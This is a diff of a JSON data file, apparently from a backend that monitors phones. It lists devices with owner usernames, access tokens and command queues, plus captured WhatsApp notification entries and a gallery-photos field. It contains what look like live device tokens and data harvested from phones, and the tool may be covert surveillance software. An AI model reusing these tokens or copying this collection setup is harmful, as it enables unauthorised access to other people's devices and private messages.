@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776767476300,
+    "lastSeen": 1776767479566,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4452,6 +4452,14 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎3781 pesan dari 19 chat",
+        "time": "21/04 17:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767479830
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎3780 pesan dari 19 chat",
         "time": "21/04 17:31",
         "pkg": "com.whatsapp",
@@ -8440,14 +8448,6 @@
         "time": "21/04 17:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1776765676992
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎4220 pesan dari 23 chat",
-        "time": "21/04 17:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776765673656
       }
     ],
     "galleryPhotos": [],
@@ -8507,7 +8507,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776767475794,
+    "lastSeen": 1776767478762,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
